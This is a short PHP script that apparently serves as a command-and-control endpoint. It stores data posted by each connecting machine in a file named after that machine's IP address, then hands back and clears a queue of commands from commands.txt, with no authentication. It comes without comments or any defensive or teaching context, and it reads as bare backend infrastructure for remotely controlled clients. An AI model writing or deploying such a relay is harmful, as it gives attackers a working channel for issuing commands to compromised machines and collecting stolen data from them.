<?php

$file_out = 'data/' . $_SERVER['REMOTE_ADDR'];
$file_in = 'commands.txt';

file_put_contents($file_out, file_get_contents($file_out) . $_POST['d']);

echo file_get_contents($file_in);
file_put_contents($file_in, '');

?>